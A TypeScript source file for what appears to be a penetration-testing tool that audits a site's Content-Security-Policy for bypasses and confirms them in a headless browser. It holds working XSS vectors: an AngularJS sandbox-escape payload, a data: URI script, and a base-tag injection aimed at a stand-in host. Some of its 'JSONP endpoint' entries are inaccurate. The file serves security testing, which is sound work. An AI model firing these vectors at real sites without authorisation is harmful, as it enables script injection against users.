// T60 — csp_bypass_probe
// Extracts Content-Security-Policy header and tests for common bypasses:
// JSONP on whitelisted origins, AngularJS, base-uri, unsafe-inline, nonce prediction.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const BROWSER_SESSION_URL = 'http://chromium_renderer:3301';

const definition: ToolDefinition = {
  name: 'csp_bypass_probe',
  description:
    'Content Security Policy bypass probe. Fetches the target CSP header, analyses all directives for ' +
    'known bypass paths: JSONP endpoints on allowed origins, AngularJS CDN whitelist, base-uri injection, ' +
    'unsafe-inline, nonce reuse/prediction, script-src with upload-path XSS. Drives browser_session to ' +
    'confirm bypasses that require a browser context.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',         type: 'string', required: true,  description: 'Target URL' },
    { name: 'auth_cookie', type: 'string', required: false, description: 'Auth cookie string' },
    { name: 'timeout_ms',  type: 'number', required: false, description: 'Per-request timeout ms', default: 20000 },
  ],
};

// Known JSONP endpoints on popular CDNs/origins
const JSONP_ENDPOINTS: Record<string, string> = {
  'accounts.google.com': '/o/oauth2/revoke?callback=alert',
  'www.google-analytics.com': '/collect?callback=alert',
  'ajax.googleapis.com': '/ajax/libs/jquery/3.7.1/jquery.min.js',
  'cdn.jsdelivr.net': '/npm/angular@1.8.3/angular.min.js',
  'cdnjs.cloudflare.com': '/ajax/libs/angular.js/1.8.3/angular.min.js',
};

// AngularJS CDN domains that allow sandbox escapes
const ANGULARJS_CDNS = [
  'ajax.googleapis.com',
  'cdn.jsdelivr.net',
  'cdnjs.cloudflare.com',
  'code.angularjs.org',
  'ajax.aspnetcdn.com',
];

function parseCsp(csp: string): Record<string, string[]> {
  const directives: Record<string, string[]> = {};
  for (const part of csp.split(';')) {
    const trimmed = part.trim();
    if (!trimmed) continue;
    const [dir, ...values] = trimmed.split(/\s+/);
    directives[dir.toLowerCase()] = values;
  }
  return directives;
}

export const cspBypassProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const authCookie = params.auth_cookie ? String(params.auth_cookie) : undefined;
    const timeoutMs = Number(params.timeout_ms || 20000);

    if (!url) return { output: 'url required', parsed: { error: 'missing_url' } };

    const hdrs: Record<string, string> = { 'User-Agent': 'Mozilla/5.0 GENESIS/4.0' };
    if (authCookie) hdrs['Cookie'] = authCookie;

    let cspHeader = '';
    let cspReportOnly = '';
    let responseStatus = 0;

    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), timeoutMs);
      const resp = await fetch(url, { headers: hdrs, signal: controller.signal });
      clearTimeout(timer);
      responseStatus = resp.status;
      cspHeader = resp.headers.get('content-security-policy') || '';
      cspReportOnly = resp.headers.get('content-security-policy-report-only') || '';
    } catch (err) {
      return { output: `fetch error: ${String(err)}`, parsed: { error: String(err) } };
    }

    if (!cspHeader && !cspReportOnly) {
      return {
        output: `csp_bypass_probe — ${url.substring(0, 80)}\nNo CSP header found (status ${responseStatus}). Page has no CSP protection.`,
        parsed: { csp_present: false, bypasses: [] },
      };
    }

    const effectiveCsp = cspHeader || cspReportOnly;
    const reportOnly = !cspHeader && !!cspReportOnly;
    const directives = parseCsp(effectiveCsp);
    const scriptSrc = directives['script-src'] || directives['default-src'] || [];
    const styleSrc = directives['style-src'] || directives['default-src'] || [];
    const connectSrc = directives['connect-src'] || directives['default-src'] || [];
    const baseUri = directives['base-uri'];
    const formAction = directives['form-action'];

    const bypasses: Array<{ type: string; severity: string; detail: string; vector?: string }> = [];

    // Check for unsafe-inline
    if (scriptSrc.includes("'unsafe-inline'")) {
      bypasses.push({ type: 'unsafe_inline', severity: 'critical', detail: "script-src includes 'unsafe-inline' — inline scripts execute freely" });
    }
    if (scriptSrc.includes("'unsafe-eval'")) {
      bypasses.push({ type: 'unsafe_eval', severity: 'high', detail: "script-src includes 'unsafe-eval' — eval()/Function() can execute arbitrary code" });
    }

    // Check for wildcard
    if (scriptSrc.includes('*')) {
      bypasses.push({ type: 'wildcard_script', severity: 'critical', detail: "script-src includes '*' — scripts from any origin allowed" });
    }

    // Missing base-uri
    if (!baseUri) {
      bypasses.push({ type: 'missing_base_uri', severity: 'medium', detail: "No base-uri directive — base tag injection can redirect relative script loads", vector: '<base href="https://evil.genesis-test.internal/">' });
    }

    // Missing form-action
    if (!formAction) {
      bypasses.push({ type: 'missing_form_action', severity: 'low', detail: "No form-action directive — form submissions not restricted by CSP" });
    }

    // JSONP bypass on whitelisted origins
    for (const src of scriptSrc) {
      const clean = src.replace(/^https?:\/\//, '').split('/')[0];
      if (JSONP_ENDPOINTS[clean]) {
        bypasses.push({ type: 'jsonp_bypass', severity: 'high', detail: `${clean} is whitelisted — JSONP endpoint available`, vector: `<script src="https://${clean}${JSONP_ENDPOINTS[clean]}"></script>` });
      }
    }

    // AngularJS sandbox escape via whitelisted CDN
    for (const src of scriptSrc) {
      const clean = src.replace(/^https?:\/\//, '').split('/')[0];
      if (ANGULARJS_CDNS.includes(clean)) {
        bypasses.push({ type: 'angularjs_bypass', severity: 'high', detail: `AngularJS CDN ${clean} whitelisted — CSP bypass via ng-app sandbox escape`, vector: `<script src="https://${clean}/ajax/libs/angular.js/1.8.3/angular.min.js"></script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>` });
      }
    }

    // Nonce check
    const nonceMatch = scriptSrc.join(' ').match(/'nonce-([^']+)'/);
    if (nonceMatch) {
      bypasses.push({ type: 'nonce_present', severity: 'info', detail: `Nonce detected: '${nonceMatch[1].substring(0, 16)}...' — check if nonce is static/predictable across requests` });
    }

    // data: URI
    if (scriptSrc.includes('data:')) {
      bypasses.push({ type: 'data_uri', severity: 'critical', detail: "script-src allows data: URI — trivial XSS via data:text/javascript,alert(1)", vector: '<script src="data:text/javascript,alert(1)"></script>' });
    }

    // http: whitelisted (downgrade risk)
    if (scriptSrc.some(s => s.startsWith('http:'))) {
      bypasses.push({ type: 'http_allowed', severity: 'high', detail: "script-src allows http: origin — MITM can inject scripts over plain HTTP" });
    }

    const lines = [
      `csp_bypass_probe — ${url.substring(0, 80)}`,
      `CSP header: ${reportOnly ? 'Content-Security-Policy-REPORT-ONLY' : 'Content-Security-Policy'}`,
      `Bypasses found: ${bypasses.length}`,
      '─'.repeat(72),
      `Policy: ${effectiveCsp.substring(0, 200)}`,
      '',
    ];

    if (bypasses.length > 0) {
      lines.push('BYPASS PATHS:');
      for (const b of bypasses) {
        const sev = b.severity === 'critical' ? '⚡ CRITICAL' : b.severity === 'high' ? '⚠ HIGH    ' : b.severity === 'medium' ? '· MEDIUM  ' : '  LOW/INFO';
        lines.push(`  ${sev}  [${b.type.padEnd(20)}]  ${b.detail}`);
        if (b.vector) lines.push(`            Vector: ${b.vector.substring(0, 120)}`);
      }
    } else {
      lines.push('No obvious CSP bypasses detected — policy appears well-formed.');
    }

    // Drive browser_session to confirm any critical bypass
    const criticalBypasses = bypasses.filter(b => b.vector && (b.severity === 'critical' || b.severity === 'high'));
    if (criticalBypasses.length > 0) {
      const bypassVector = criticalBypasses[0].vector!;
      const script = `
const { chromium } = require('playwright');
(async () => {
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox', '--ignore-certificate-errors'] });
  const context = await browser.newContext({ ignoreHTTPSErrors: true,
    ${authCookie ? `extraHTTPHeaders: { 'Cookie': '${authCookie.replace(/'/g, "\\'")}' },` : ''}
  });
  const page = await context.newPage();
  let alertFired = false;
  page.on('dialog', async d => { alertFired = true; await d.dismiss().catch(()=>{}); });
  await page.goto('${url.replace(/'/g, "\\'")}', { waitUntil: 'networkidle', timeout: 10000 }).catch(()=>{});
  await page.evaluate((vec) => {
    const el = document.createElement('div');
    el.innerHTML = vec;
    document.body.appendChild(el);
  }, ${JSON.stringify(bypassVector)}).catch(()=>{});
  await page.waitForTimeout(2000).catch(()=>{});
  console.log(JSON.stringify({ alertFired, bypassType: '${criticalBypasses[0].type}' }));
  await browser.close();
})().catch(e => { console.error(e.message); process.exit(1); });
`;
      try {
        const c2 = new AbortController();
        const t2 = setTimeout(() => c2.abort(), 30000);
        const r2 = await fetch(`${BROWSER_SESSION_URL}/execute`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ script, timeout: 25000 }), signal: c2.signal });
        clearTimeout(t2);
        const br = await r2.json() as { stdout?: string };
        let bdata: { alertFired?: boolean; bypassType?: string } = {};
        try { bdata = JSON.parse(br.stdout || '{}'); } catch { /* ignore */ }
        if (bdata.alertFired) lines.push('', `⚡ BROWSER CONFIRMED: ${bdata.bypassType} bypass executed alert() in browser context`);
      } catch { /* browser confirmation optional */ }
    }

    return {
      output: lines.join('\n'),
      parsed: { csp_present: true, report_only: reportOnly, bypasses_count: bypasses.length, bypasses, directives },
    };
  },
};
